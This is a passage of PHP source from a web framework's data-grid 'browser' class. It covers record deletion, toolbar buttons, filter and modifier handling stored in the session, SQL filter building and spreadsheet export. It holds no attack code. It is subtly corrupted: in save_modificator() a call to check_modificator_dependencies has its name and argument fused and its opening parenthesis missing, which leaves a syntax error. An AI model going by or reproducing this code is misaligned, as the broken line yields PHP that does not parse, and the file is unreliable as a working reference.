        $dm->save_ignore_sql_errors_state(true);
        $result = $dm->delete($this->table, $key);
        $dm->restore_ignore_sql_errors_state();
        if ($result) {
          $this->do_after_delete($key);
        }
        return $result;
      } else
        return false;
    } else {
      if ($this->setting('alert_from_prior_session'))
        return false;
      else
        return true;
    }

  }

  function do_after_add_capability($capability, $options = array()) { 

    global $auth, $db, $url;
    
    parent::do_after_add_capability($capability, $options);

    switch ($capability) { 
      case 'insert':
        global $url;
        $href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'insert'
                                             , URL_PARAM_KEY          => null
                                             , URL_PARAM_POPUP_WINDOW => 1
                                             , URL_PARAM_ENTITY       => $this->entity_name_for('insert')
                                             , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                             , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                             ));
        $this->add_button(array( 'value'        => trn('Insert')
                               //, 'image'        => 'img_new.gif'
                               , 'href'         => sql_placeholder(OPEN_POPUP, $href)
                               , 'type'         => 'javascript'
                               , 'class'        => 'action-item'
                               , 'shared_image' => true
                               , 'hint'         => trn('By clicking this link you will be redirected to form for creating new record')
                               )); 
        break;
      case 'export':
        global $url;  
        $href = $url->generate_full_url(array( URL_PARAM_ACTION        => 'export' 
                                             , URL_PARAM_KEY           => null
                                             , URL_PARAM_CONFIGURATION => $this->configuration_name()
                                             , URL_PARAM_ENTITY        => $this->entity_name_for('export')
                                             , URL_PARAM_BIND_KEY      => $db->encrypt_key($this->bind_key())
                                             , URL_PARAM_BIND_ENTITY   => $this->binded_to_class()
                                             ));
        $this->add_button(array( 'value'        => trn('Export')
                               , 'image'        => 'img_export.gif'
                               , 'href'         => $href
                               , 'shared_image' => true
                               , 'hint'         => trn($this->export_description)
                               )); 
        break;
      case 'print':
        global $url;  
        $href = $url->generate_full_url(array( URL_PARAM_ACTION        => 'print_list' 
                                             , URL_PARAM_KEY           => null
                                             , URL_PARAM_CONFIGURATION => $this->configuration_name()
                                             , URL_PARAM_ENTITY        => $this->entity_name_for('print')
                                             , URL_PARAM_BIND_KEY      => $db->encrypt_key($this->bind_key())
                                             , URL_PARAM_BIND_ENTITY   => $this->binded_to_class()
                                             ));
        $this->add_button(array( 'value'        => trn('Print')
                               , 'image'        => 'img_print.gif'
                               , 'href'         => $href
                               , 'shared_image' => true
                               , 'hint'         => trn('Print')
                               , 'new_window'   => true
                               )); 
        break;
      case 'delete_all':
        $href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'delete_all'
                                             , URL_PARAM_KEY          => null
                                             , URL_PARAM_POPUP_WINDOW => 1
                                             , URL_PARAM_ENTITY       => $this->entity_name_for('delete_all')
                                             , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                             , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                             ));
        $this->add_button(array( 'value'        => trn('Delete all')
                               , 'image'        => 'img_delete.gif'
                               , 'href'         => $this->js_post_back('brw_delete_all', $this->bind_key(), for_javascript('Are you sure you want to delete all records?'))
                               , 'type'         => 'javascript'
                               , 'shared_image' => true
                               , 'hint'         => trn('Delete all records')
                               )); 
        break;    
      case 'delete_selected':
        $this->add_capability('delete');
        $this->add_capability('select');
        break;    
    }

  }
  
  function handle_actions() {

    $result = parent::handle_actions(); 
    
    if (!$result) {
      switch (get($this->url_param_name('action'))) {
        case 'export':
          $this->export();
          exit();
      }
    }
    
    return $result;  

  }
  
  function is_print_mode() {
    
    return (get(URL_PARAM_ACTION) == 'print_list');
    
  }
  
  function handle_submit() {

    global $db;

    $result = parent::handle_submit(); 
    
    $sender_name = $this->context_post(POST_PARAM_SENDER_NAME);
    $event_name  = $this->context_post(POST_PARAM_EVENT_NAME);
    $event_value = $this->context_post(POST_PARAM_EVENT_VALUE);

    if (!$result and $event_name and ($sender_name == $this->id())) {
      
      switch ($event_name) {
        case 'brw_click':
          $this->do_on_click($event_value);
          break;
        case 'brw_delete': 
          if ($event_value = $db->decrypt_key($event_value)) {
            if (!$this->delete($event_value)) {
              global $dm;
              $this->set_setting('alert_from_prior_session', $dm->error);
            } 
          } else {
            $this->set_setting('alert_from_prior_session', trn('Can not find record for deletion'));
          }
          $this->submit_handled(); 
          break;
        case 'brw_delete_selected':
          foreach ($this->selection() as $key) {
            if (!$this->delete($key)) {
              global $dm;
              $this->set_setting('alert_from_prior_session', $this->setting('alert_from_prior_session').$dm->error.'; ');
            }
          }
          $this->submit_handled(); 
          break;
        case 'brw_filter_reset':
          $this->clear_filters();
          $this->submit_handled(true); 
          break;
        case 'brw_modificator_clear':
          $this->clear_modificators();
          $this->submit_handled(); 
          break;
        case 'brw_filter_clear_one':
          $this->clear_filter($event_value);
          $this->submit_handled(true); 
          break;
        case 'brw_modificator_clear_one':
          $this->clear_modificator($event_value);
          $this->submit_handled(); 
          break;
        case 'brw_filter_prior_day':
          $this->filter_prior_day($event_value);
          $this->submit_handled(true); 
          break;
        case 'brw_filter_next_day':
          $this->filter_next_day($event_value);
          $this->submit_handled(true); 
          break;
        case 'brw_modificator_prior_day':
          $this->modificator_prior_day($event_value);
          $this->submit_handled(); 
          break;
        case 'brw_modificator_next_day':
          $this->modificator_next_day($event_value);
          $this->submit_handled(); 
          break;
        case 'brw_filter_set':
          $this->save_filter();
          $this->submit_handled(true); 
          break;
        case 'brw_modificator_change':  
          $this->save_modificator();
          $this->submit_handled(); 
          break;
        case 'brw_modificator_modify':
          $this->save_modificator();
          $this->modify();
          $this->submit_handled(); 
          break;
        case 'brw_alphabet_filter_set':
          $this->set_filter("alphabet", $event_value);
          $pager = new custom_pager();
          $this->submit_handled(true); 
          break;
        case 'brw_change_layout':  
          $this->change_layout($this->context_post('cmb_layout'));
          $this->submit_handled(); 
          break;
        case 'brw_delete_all':
          if ($this->bind_field) {
            $db->query('DELETE FROM '.$this->table.' WHERE '.$this->bind_field.' = ?', $event_value);
          } else {
            $db->query('DELETE FROM '.$this->table);
          }
          $this->submit_handled(); 
          break;
      }
    }
    
    return $result;
    
  }

  function filter($name, $default = null) {

    $browser_configuration = $this->browser_configuration();
    $filter = $browser_configuration->get_all_filters();
    return safe($filter, $name, $default);

  }

  function modificator($name, $default = null) {

    $modificator = safe($_SESSION, $this->modificator_name());
    return safe($modificator, $name, $default);

  }

  function is_filter_set($name) {

    $browser_configuration = $this->browser_configuration();
    $filter = $browser_configuration->get_all_filters();
    return (is_array($filter) and array_key_exists($name, $filter));

  }

  function is_modificator_set($name) {

    $modificator = safe($_SESSION, $this->modificator_name());
    return (is_array($modificator) and array_key_exists($name, $modificator));

  }

  function is_filter_empty($name) {
            
    $value = $this->filter($name);
    if (is_array($value)) { // lookup_text or multiple combo
      return (!count($value) and !strlen(safe($value, 'value')) and !strlen(safe($value, 'text')));
    } else {
      return (strlen($value) == 0);
    }

  }

  function is_modificator_empty($name) {
            
    $value = $this->modificator($name);
    if (is_array($value)) { // lookup_text or multiple combo
      return (!count($value) and !strlen(safe($value, 'value')) and !strlen(safe($value, 'text')));
    } else {
      return (strlen($value) == 0);
    }

  }

  function filter_name() {
    
    return $this->configuration_name();
    
  }
  
  function modificator_name() {
    
    if (!$this->modificator_name) {
      if (!$this->modificator_name)
        $this->modificator_name = $this->context_id('modificator');
    }
    
    return $this->modificator_name;

  }

  function set_filter($name, $value) {
    
    $browser_configuration = $this->browser_configuration();

    $filter = $this->filters[$name];
    $old_value = $this->filter($name);
    switch (safe($filter, "type")) {
      case "lookup_text":
        $browser_configuration->clear_filter($name);
        if (safe($value, 'value')) {
          $browser_configuration->set_filter($name, array('value' => $value['value']));
          return (safe($old_value, 'value') != safe($value, 'value'));
        } else  
        if (safe($value, 'text')) {
          $browser_configuration->set_filter($name, array('text' => safe($value, 'text')));
          return (safe($old_value, 'text') != safe($value, 'text'));
        } else {
          return ((safe($old_value, 'value') != safe($value, 'value')) || (safe($old_value, 'text') != safe($value, 'text')));
        }
        break;
      case "checkbox":
        if (($value == "on") or ($value == 1))
          $browser_configuration->set_filter($name, 1);
        else  
          $browser_configuration->set_filter($name, 0);
        return ($old_value != $value);
        break;
      default:      
        $browser_configuration->set_filter($name, $value);
        return ($old_value != $value);
        break;
    }
    return ($old_value != $value);

  }

  function set_modificator($name, $value) {
    
    $modificator = $this->modificators[$name];
    
    $old_value = $this->modificator($name);
    switch (safe($modificator, "type")) {
      case "lookup_text":
        unset($_SESSION[$this->modificator_name()][$name]);
        if (safe($value, 'value'))
          $_SESSION[$this->modificator_name()][$name]['value'] = $value['value'];
        else  
        if (safe($value, 'text'))
          $_SESSION[$this->modificator_name()][$name]['text'] = safe($value, 'text');
        break;
      case "checkbox":
        if (($value == "on") or ($value == 1))
          $_SESSION[$this->modificator_name()][$name] = 1; 
        else  
          $_SESSION[$this->modificator_name()][$name] = 0; 
        break;
      default:      
        $_SESSION[$this->modificator_name()][$name] = $value; 
        break;
    }
    return ($old_value != $value);

  }

  function filter_prior_day($name) {

    if ($value = $this->filter($name)) {
      // assuming DD-MM-YYYY format
      $value = explode('-', $value);
      $value = strftime(INTERNAL_DATE_FORMAT, mktime(0, 0, 0, $value[1], $value[0]-1, $value[2]));
      if ($this->set_filter($name, $value))
        $this->check_filter_dependencies(array($name));
    }

  }

  function modificator_prior_day($name) {

    if ($value = $this->modificator($name)) {
      // assuming DD-MM-YYYY format
      $value = explode('-', $value);
      $value = strftime(INTERNAL_DATE_FORMAT, mktime(0, 0, 0, $value[1], $value[0]-1, $value[2]));
      if ($this->set_modificator($name, $value))
        $this->check_modificator_dependencies(array($name));
    }

  }

  function filter_next_day($name) {

    if ($value = $this->filter($name)) {
      // assuming DD-MM-YYYY format
      $value = explode('-', $value);
      $value = strftime(INTERNAL_DATE_FORMAT, mktime(0, 0, 0, $value[1], $value[0]+1, $value[2]));
      if ($this->set_filter($name, $value))
        $this->check_filter_dependencies(array($name));
    }

  }

  function modificator_next_day($name) {

    if ($value = $this->modificator($name)) {
      // assuming DD-MM-YYYY format
      $value = explode('-', $value);
      $value = strftime(INTERNAL_DATE_FORMAT, mktime(0, 0, 0, $value[1], $value[0]+1, $value[2]));
      if ($this->set_modificator($name, $value))
        $this->check_modificator_dependencies(array($name));
    }

  }

  function check_filter_dependencies($modified_filters) {

    $operated_filters = array();
    while (count($modified_filters) > 0) {
      $operated_filters = array_merge($modified_filters, $operated_filters);
      $filters = $modified_filters;
      $modified_filters = array();
      foreach ($filters as $index => $name) {
        foreach ($this->filters as $filter_name => $filter) {
          $depends_on = safe($filter, 'depends_on');
          if ($depends_on and !is_array($depends_on))
            $depends_on = array($depends_on);
          if ($depends_on and in_array($name, $depends_on) and (!in_array($filter['name'], $operated_filters) or safe($filter, 'always_set'))) {
            if ($this->set_filter($filter['name'], ''))
              array_push($modified_filters, $filter['name']);
          }
        }
      }
    }

  }

  function check_modificator_dependencies($modified_modificators) {

    $operated_modificators = array();
    while (count($modified_modificators) > 0) {
      $operated_modificators = array_merge($modified_modificators, $operated_modificators);
      $modificators = $modified_modificators;
      $modified_modificators = array();
      foreach ($modificators as $index => $name) {
        foreach ($this->modificators as $modificator_name => $modificator) 
          if ((safe($modificator, 'depends_on') == $name) and (!in_array($modificator_name, $operated_modificators) or safe($modificator, 'always_set'))) {
            if ($this->set_modificator($modificator_name, ''))
              array_push($modified_modificators, $modificator_name);
          }
      }
    }

  }

  function save_filter() {

    $modified_filters = array();
    $filter = $this->context_post('filter');
    if (is_array($filter)) {
      foreach ($filter as $name => $value) {
        if ($this->set_filter($name, $value)) 
          array_push($modified_filters, $name); 
      }
      $this->check_filter_dependencies($modified_filters);
    }

  }

  function save_modificator() {

    $modified_modificators = array();
    $modificator = $this->context_post('modificator');
    if (is_array($modificator)) {
      foreach ($modificator as $modificator_name => $value) {
        if ($this->set_modificator($modificator_name, $value)) 
          array_push($modified_modificators, $modificator_name); 
      }
      $this->check_modificator_dependencimodified_modificators);
    }

  }

  function clear_filters() {

    $browser_configuration = $this->browser_configuration();
    $browser_configuration->clear_all_filters();

  }

  function clear_modificators() {

    session_unregister($this->modificator_name()); 

  }

  function clear_filter($name) {

    if (!$this->is_filter_empty($name)) {
      $browser_configuration = $this->browser_configuration();
      $browser_configuration->set_filter($name, null);
      $this->check_filter_dependencies(array($name));
    }

  }
  
  function clear_modificator($name) {

    if (!$this->is_modificator_empty($name)) {
      unset($_SESSION[$this->modificator_name()][$name]);  
      $_SESSION[$this->modificator_name()][$name] = null;
      $this->check_modificator_dependencies(array($name));
    }

  }

  function is_filtered($visible_only = false) {
    
    foreach($this->filters as $name => $filter)
      if (!$this->is_filter_empty($name))
        if (!$visible_only or !safe($filter, 'hidden'))
          return true;
    return false;
    
  }

  function apply_filter($sql) {
    
    $error = '';
    $filter_sql = '';
    foreach ($this->filters as $filter_name => $filter) {
      $value = $this->filter($filter_name); 
      if (strval($value) != '') {
        $where = null;
        switch (safe($filter, 'type')) {
          case 'custom_list':
            $idx = 1;
            if (safe($filter, 'multiple')) {
              foreach($filter['list'] as $item) {
                if (safe($item, 'where'))
                  if (in_array($idx, $value)) 
                    $where .= ($where?" OR ":"").safe($item, 'where').' ';
                $idx++;
              }
              if ($where)
                $where = '('.$where.')';
            } else {
              foreach($filter['list'] as $item) {
                if (safe($item, 'value', $idx) == intval($value)) {
                  $where = safe($item, 'where');
                  break;
                } else 
                  $idx++;
              }
            }
            break;
          case 'date': 
            global $db;
            $value = $db->to_date($value);
            $where = $filter['where'];
            break;
          case 'month': 
            global $db;
            $value = $db->to_date($value.'-01', 'YMD');
            $value = substr($value, 0, 7);
            $where = safe($filter, 'where');
            break;
          case 'lookup_text':
            if (safe($value, 'value'))
              $where = safe($filter, 'where_value');
            else
              $where = safe($filter, 'where_text');
            $value = safe($value, 'value', safe($value, 'text'));
            if (!strlen($value))
              $where = null;
            break;  
          case 'combo':
          case 'combo_tree':
          case 'combo_plain_tree':
            $where = safe($filter, 'where');
            if ($value == -1)
              $where = preg_replace('/=[ ]*[?]/i', 'IS NULL', $where);
            if ($value == -2)
              $where = preg_replace('/=[ ]*[?]/i', 'IS NOT NULL', $where);
            break;
          default:
            $where = safe($filter, 'where');
            break;
        }
        if ($where) {
          preg_match_all('/[?@]/', $where, $placeholders);
          $values = array();
          for ($i = 0; $i < count($placeholders[0]); $i++) {
            $value = $this->do_apply_filter_value($filter_name, $value);
            array_push($values, $value);
          }
          $filter_sql = incs($filter_sql, sql_placeholder_ex($where, $values, $error), ' AND ');
        }
      }
    }
                
    if ($filter_sql)
      return str_replace('/*filter*/', ' AND '.$filter_sql, $sql);
    else
      return str_replace('/*filter*/', '', $sql);

  }

  function do_apply_filter_value($filter_name, $value) {
    
    return $value;
    
  }

  function modify() {

    @set_time_limit(0);
    
    $values = array();
    foreach ($this->modificators as $modificator_name => $modificator) {
      $value = $this->modificator($modificator_name); 
      if (strval($value) != '') {
        switch (safe($modificator, 'type')) {
          case 'clear':
            $values[$value] = null;
            break;
          case 'date': 
            global $db;
            $value = $db->to_date($value);
            if (!safe($modificator, 'field')) {
              foreach ($this->selection() as $key)
                $this->do_modify($modificator_name, $value, $key);
            } else
              $values[$modificator_name] = $value;
            break;
          default:
            if (!safe($modificator, 'field')) {
              foreach ($this->selection() as $key)
                $this->do_modify($modificator_name, $value, $key);
            } else
              $values[$modificator_name] = $value;
            break;
        }
      }
    }
                
    if (count($values)) {
      global $dm;
      foreach ($this->selection() as $key)
        $dm->update($this->table, $values, $key);
    }
    
    $this->clear_modificators();

  }

  function selection() {

    $result = array();
    $selection = $this->context_post("rec");
    if ($selection and is_array($selection)) 
      foreach ($selection as $key => $value) 
        if ($value == "on") 
          $result[] = $key; 
    return $result;

  }

  function do_fill_field($row, $field_name) {

    return null; 

  }

  function do_export($delimiter = ',') { }

  function export() {

    set_time_limit(0);

    header('Pragma: public');
    header('Expires: 0');
    header('Content-Type: application/ms-excel');

    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if ((is_integer (strpos($user_agent, 'msie'))) && (is_integer (strpos($user_agent, 'win')))) {
      header('Content-Disposition: filename="'.$this->export_file_name.$this->export_file_extension.'"');
    } else {
      header('Content-Disposition: attachment; filename="'.$this->export_file_name.$this->export_file_extension.'"');
    }    

    header('Content-Description: '.$this->title);
    $export = $this->do_export($this->export_delimiter);
    header('Content-Length: '.strlen($export));
    header('Cache-Control: private');
    
    echo($export);

  }

  function do_on_click($key) {
    
  }

  function buttons_amount() {
    
    return count($this->buttons);
    
  }
  
  function filters_amount($visible_only = false) {
    
    if ($visible_only) {
      $amount = 0;
      foreach($this->filters as $filter_name => $filter)
        if (!safe($filter, 'hidden'))
          $amount++;
    } else
      $amount = count($this->filters);

    return $amount;
    
  }
  
  function modificators_amount($visible_only = false) {
    
    return count($this->modificators);
    
  }

  function is_filter_visible($filter) {
    
    return !safe($filter, 'hidden');
    
  }

  function translate_key_for($action, $row) {
    
    return $row[$this->key_field];
    
  }
  
  function url_param_name($scope) {

    $result = safe($this->url_param, $scope);
    
    if (!$result) {
      switch ($scope) {
        case 'action': 
          $result = URL_PARAM_ACTION;
          break;
        case 'page_number': 
          $result = URL_PARAM_PAGE_NUMBER;
          break;
        case 'page_size': 
          $result = URL_PARAM_PAGE_SIZE;
          break;
        case 'key': 
          $result = URL_PARAM_KEY;
          break;
        case 'layout': 
          $result = URL_PARAM_LAYOUT;
          break;
        case 'filter': 
          $result = URL_PARAM_FILTER;
          break;
        case 'configuration': 
          $result = URL_PARAM_CONFIGURATION;
          break;
        case 'bind_key': 
          $result = URL_PARAM_BIND_KEY;
          break;
      }
      if ($result) {
        if ($this->binded)
          if ($this->bind_key())
            $result .= $this->bind_key().md5(get_class($this));
        $this->url_param[$scope] = $result;
      }
    }
    return $result;

  }
  
  function add_layout($layout) {
    
    $this->layouts[] = $layout;
    
  }
  
  function do_get_default_layout() {

    return 0;

  }
  
  function get_default_layout() {
    
    if ($this->default_layout == -1)
      $this->default_layout = $this->do_get_default_layout();
    return $this->default_layout;
    
  }

  function layout_index() {
    
    if (get(URL_PARAM_LAYOUT)) {
      $this->change_layout(get(URL_PARAM_LAYOUT));
      global $url;
      redirect($url->generate_url(array(URL_PARAM_LAYOUT => null)));
    }
    if (!session_get($this->context_id('layout')))
      $this->change_layout($this->get_default_layout());
    return session_get($this->context_id('layout'));

  }

  function layout() {
    
    return $this->layouts[$this->layout_index()];

  }

  function get_on_click_script($row) {

    return null;

  }
  
  function get_on_select_row_script($row) {

    return null;

  }

  function get_on_enter_script($row) {

    return null;

  }
  
  function application_name() {

    if (!$this->binded) {
      $result = $this->get_application_name();
      if (!$result and $this->title) 
        $result = trn($this->title).' - '.get_config('application_name');
      return $result;  
    }

  }
  
  function do_modify($modificator_name, $value, $key) {
    
  }
  
  function do_on_layout_change($new_layout) {
  }
  
  function change_layout($new_layout) {

    $current_layout = session_get($this->context_id('layout'));
    if ($current_layout != $new_layout) {
      session_set($this->context_id('layout'), $new_layout);
      $this->do_on_layout_change($new_layout);
    }

  }
  
  function get_prepared_sql($sql) {

    return $this->apply_filter($sql);

  }

  function sql() {            

    if (!$this->sql) {
      if (!$this->table) {
        $this->errors[] = 'Either table or sql property must be set in browser descendant class';
      } else { 
        $sql = 'SELECT * FROM '.$this->table.' WHERE 1=1 /*filter*/ ';
        if ($this->capable('change_order'))
          $sql .= 'ORDER BY '.$this->order_field;
        else
          $sql .= '/*order*/';
        return $sql;
      }  
    } else {
      return $this->sql;
    }

  }
  
  function configuration_name() {
    
    if (!$this->configuration_name) {
      $this->configuration_name = get($this->url_param_name('configuration'));
      if (!$this->configuration_name)
        if ($this->filter_name)
          $this->configuration_name = $this->filter_name; 
      if (!$this->configuration_name)
        $this->configuration_name = get($this->url_param_name('filter'));
      if (!$this->configuration_name)
        $this->configuration_name = $this->context_id('configuration');
    }

    return $this->configuration_name;

  }
  
  function do_on_configuration_change($new_layout) {
    
  }
  
  function browser_configuration() {
    
    if (!$this->__browser_configuration)
      $this->__browser_configuration = new browser_configuration($this->configuration_name());

    return $this->__browser_configuration;
    
  }
  
}

?>
